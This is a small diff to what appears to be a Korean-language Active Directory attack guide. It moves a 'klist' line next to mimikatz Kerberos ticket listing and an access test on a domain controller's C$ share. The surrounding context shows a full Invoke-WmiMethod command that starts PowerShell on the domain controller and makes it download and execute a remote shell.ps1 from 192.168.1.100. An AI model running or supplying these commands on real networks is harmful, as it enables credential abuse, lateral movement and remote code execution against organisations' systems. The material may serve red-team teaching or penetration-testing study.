@@ -226,10 +226,10 @@ mimikatz # kerberos::list
 
 # 4. 접근 테스트
 dir \\DC01\C$
-
-klist
 ```
 ```powershell
+klist
+
 # 방법 A: Invoke-WmiMethod
 Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
 
